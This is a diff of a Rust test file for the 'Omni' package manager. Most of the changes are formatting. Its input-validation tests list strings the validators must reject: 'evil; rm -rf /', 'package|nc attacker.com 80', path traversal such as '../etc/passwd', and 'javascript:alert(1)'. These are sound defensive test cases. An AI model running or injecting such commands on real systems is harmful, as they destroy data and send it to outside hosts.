@@ -1,7 +1,7 @@
-use omni::*;
 use anyhow::Result;
-use tokio::test;
+use omni::*;
 use std::sync::Arc;
+use tokio::test;
 
 /// Comprehensive integration tests for the Omni package manager
 #[cfg(test)]
@@ -27,60 +27,63 @@ mod comprehensive_tests {
     #[test]
     async fn test_mock_package_operations() -> Result<()> {
         let mut brain = OmniBrain::new(true, false).await?;
-        
+
         // Test install
         brain.install("test-package", Some("apt")).await?;
-        
+
         // Test list installed
         let installed = brain.list_installed();
         assert!(!installed.is_empty());
-        
+
         // Test remove
         brain.remove("test-package", Some("apt")).await?;
-        
+
         // Test update
         brain.update_all();
-        
+
         // Test snapshot
         brain.create_snapshot();
-        
+
         Ok(())
     }
 
     #[test]
     async fn test_transaction_management() -> Result<()> {
         let mut manager = TransactionManager::new().await?;
-        
+
         // Begin transaction
-        let transaction_id = manager.begin_transaction(
-            TransactionType::Install,
-            "Test transaction".to_string()
-        ).await?;
-        
+        let transaction_id = manager
+            .begin_transaction(TransactionType::Install, "Test transaction".to_string())
+            .await?;
+
         // Add operation
-        let operation_id = manager.add_operation(
-            TransactionType::Install,
-            "test-package".to_string(),
-            "apt".to_string(),
-            None
-        ).await?;
-        
+        let operation_id = manager
+            .add_operation(
+                TransactionType::Install,
+                "test-package".to_string(),
+                "apt".to_string(),
+                None,
+            )
+            .await?;
+
         assert!(!transaction_id.is_empty());
         assert!(!operation_id.is_empty());
-        
+
         Ok(())
     }
 
     #[test]
     async fn test_dependency_resolution() -> Result<()> {
         let resolver = AdvancedDependencyResolver::new().await?;
-        
-        let plan = resolver.resolve_with_strategy(
-            &["firefox".to_string()],
-            None,
-            ResolutionStrategy::Conservative
-        ).await?;
-        
+
+        let plan = resolver
+            .resolve_with_strategy(
+                &["firefox".to_string()],
+                None,
+                ResolutionStrategy::Conservative,
+            )
+            .await?;
+
         assert!(!plan.packages.is_empty());
         Ok(())
     }
@@ -88,20 +91,19 @@ mod comprehensive_tests {
     #[test]
     async fn test_database_operations() -> Result<()> {
         let db = Database::new().await?;
-        
+
         // Test snapshot creation
-        let snapshot_id = db.create_snapshot(
-            "test-snapshot",
-            Some("Test snapshot for integration tests")
-        ).await?;
-        
+        let snapshot_id = db
+            .create_snapshot("test-snapshot", Some("Test snapshot for integration tests"))
+            .await?;
+
         // Test snapshot listing
         let snapshots = db.list_snapshots().await?;
         assert!(snapshots.iter().any(|s| s.id == snapshot_id));
-        
+
         // Test snapshot deletion
         db.delete_snapshot(&snapshot_id).await?;
-        
+
         Ok(())
     }
 
@@ -110,37 +112,38 @@ mod comprehensive_tests {
         // Test package name validation
         assert!(InputValidator::validate_package_name("firefox").is_ok());
         assert!(InputValidator::validate_package_name("../etc/passwd").is_err());
-        
+
         // Test URL validation
         assert!(InputValidator::validate_url("https://example.com").is_ok());
         assert!(InputValidator::validate_url("javascript:alert(1)").is_err());
-        
+
         // Test shell safety
         assert!(InputValidator::validate_shell_safe("safe-package").is_ok());
         assert!(InputValidator::validate_shell_safe("evil; rm -rf /").is_err());
-        
+
         Ok(())
     }
 
     #[test]
     async fn test_security_verification() -> Result<()> {
+        use crate::security::{SecurityPolicy, SecurityVerifier};
         use std::path::Path;
-        use crate::security::{SecurityVerifier, SecurityPolicy};
-        
+
         let policy = SecurityPolicy::default();
         let verifier = SecurityVerifier::new(policy);
-        
+
         // Test with a temporary file
         let temp_file = tempfile::NamedTempFile::new()?;
         let path = temp_file.path();
-        
-        let result = verifier.verify_package(
-            path,
-            None, // No checksum
-            None, // No signature
-            "test"
-        ).await;
-        
+
+        let result = verifier
+            .verify_package(
+                path, None, // No checksum
+                None, // No signature
+                "test",
+            )
+            .await;
+
         // Should succeed even without verification in test mode
         assert!(result.is_ok());
         Ok(())
@@ -150,7 +153,7 @@ mod comprehensive_tests {
     fn test_package_manager_availability() {
         // Test that package manager detection works
         use crate::boxes::*;
-        
+
         // These should not panic even if not available
         let _apt_available = apt::AptBox::is_available();
         let _dnf_available = dnf::DnfBox::is_available();
@@ -166,51 +169,51 @@ mod comprehensive_tests {
     async fn test_privilege_management() -> Result<()> {
         let mut manager = PrivilegeManager::new();
         manager.store_credentials();
-        
+
         // Test privilege validation
         PrivilegeManager::validate_minimal_privileges()?;
-        
+
         // Test can_sudo check (should not fail)
         let _can_sudo = PrivilegeManager::can_sudo();
-        
+
         // Test is_root check
         let _is_root = PrivilegeManager::is_root();
-        
+
         Ok(())
     }
 
     #[test]
     async fn test_unified_manager() -> Result<()> {
         let manager = UnifiedPackageManager::new().await?;
-        
+
         // Test available managers detection
         let available = manager.get_available_managers();
-        
+
         // At minimum, we should detect system package managers
         // This test passes regardless of what's available
         println!("Available package managers: {:?}", available);
-        
+
         Ok(())
     }
 
     #[test]
     async fn test_ssh_config() -> Result<()> {
         use crate::ssh::SshConfig;
-        
+
         let config = SshConfig::default();
         assert!(!config.host.is_empty());
         assert!(!config.username.is_empty());
-        
+
         Ok(())
     }
 
     #[test]
     async fn test_docker_config() -> Result<()> {
-        use crate::docker::{DockerConfig, ContainerInfo};
-        
+        use crate::docker::{ContainerInfo, DockerConfig};
+
         let config = DockerConfig::default();
         assert!(!config.base_images.is_empty());
-        
+
         let container_info = ContainerInfo {
             id: "test-container".to_string(),
             name: "test".to_string(),
@@ -218,28 +221,28 @@ mod comprehensive_tests {
             status: "running".to_string(),
             created: chrono::Utc::now(),
         };
-        
+
         assert_eq!(container_info.name, "test");
-        
+
         Ok(())
     }
 
     #[test]
     async fn test_error_handling() -> Result<()> {
         use crate::error_handling::{OmniError, RecoveryManager};
-        
+
         // Test error creation
         let error = OmniError::PackageNotFound {
             package: "nonexistent".to_string(),
         };
-        
+
         assert!(error.to_string().contains("nonexistent"));
-        
+
         // Test recovery manager
         let recovery_manager = RecoveryManager::new();
         // Just test that it can be created
         drop(recovery_manager);
-        
+
         Ok(())
     }
 
@@ -247,16 +250,16 @@ mod comprehensive_tests {
     async fn test_rate_limiting() -> Result<()> {
         use crate::rate_limiter::RateLimiter;
         use std::time::Duration;
-        
+
         let limiter = RateLimiter::new(10, Duration::from_secs(60), 100, Duration::from_secs(3600));
-        
+
         // Test rate limiting
         assert!(limiter.check_rate_limit("test-key", "install").is_ok());
-        
+
         // Test status
         let status = limiter.get_status("test-key", "install")?;
         assert!(status.remaining_per_minute <= 10);
-        
+
         Ok(())
     }
 }
@@ -272,51 +275,53 @@ mod performance_tests {
         let start = Instant::now();
         let _brain = OmniBrain::new(true, false).await?;
         let duration = start.elapsed();
-        
+
         println!("Brain initialization took: {:?}", duration);
         assert!(duration.as_secs() < 5); // Should initialize within 5 seconds
-        
+
         Ok(())
     }
 
     #[test]
     async fn benchmark_search_performance() -> Result<()> {
         let brain = OmniBrain::new(true, false).await?;
-        
+
         let start = Instant::now();
         let _results = brain.search("firefox");
         let duration = start.elapsed();
-        
+
         println!("Search took: {:?}", duration);
         assert!(duration.as_millis() < 1000); // Should search within 1 second
-        
+
         Ok(())
     }
 
     #[test]
     async fn benchmark_database_operations() -> Result<()> {
         let db = Database::new().await?;
-        
+
         let start = Instant::now();
         let snapshot_id = db.create_snapshot("bench-test", None).await?;
         let create_duration = start.elapsed();
-        
+
         let start = Instant::now();
         let _snapshots = db.list_snapshots().await?;
         let list_duration = start.elapsed();
-        
+
         let start = Instant::now();
         db.delete_snapshot(&snapshot_id).await?;
         let delete_duration = start.elapsed();
-        
-        println!("Database operations - Create: {:?}, List: {:?}, Delete: {:?}", 
-                create_duration, list_duration, delete_duration);
-        
+
+        println!(
+            "Database operations - Create: {:?}, List: {:?}, Delete: {:?}",
+            create_duration, list_duration, delete_duration
+        );
+
         // All operations should complete within reasonable time
         assert!(create_duration.as_secs() < 5);
         assert!(list_duration.as_secs() < 2);
         assert!(delete_duration.as_secs() < 2);
-        
+
         Ok(())
     }
 }
@@ -337,11 +342,12 @@ mod security_tests {
             "../../../etc/passwd",
             "package|nc attacker.com 80",
         ];
-        
+
         for input in dangerous_inputs {
             assert!(
                 InputValidator::validate_shell_safe(input).is_err(),
-                "Should reject dangerous input: {}", input
+                "Should reject dangerous input: {}",
+                input
             );
         }
     }
@@ -356,11 +362,12 @@ mod security_tests {
             "https://localhost/admin",
             "https://127.0.0.1/sensitive",
         ];
-        
+
         for url in dangerous_urls {
             assert!(
                 InputValidator::validate_url(url).is_err(),
-                "Should reject dangerous URL: {}", url
+                "Should reject dangerous URL: {}",
+                url
             );
         }
     }
@@ -371,15 +378,19 @@ mod security_tests {
             "../etc/passwd",
             "package/../../bin/sh",
             "package\\..\\windows\\system32",
-            "con", "prn", "aux", "nul", // Windows reserved names
-            "", // Empty name
+            "con",
+            "prn",
+            "aux",
+            "nul",           // Windows reserved names
+            "",              // Empty name
             "a".repeat(300), // Too long
         ];
-        
+
         for name in dangerous_names {
             assert!(
                 InputValidator::validate_package_name(&name).is_err(),
-                "Should reject dangerous package name: {}", name
+                "Should reject dangerous package name: {}",
+                name
             );
         }
     }
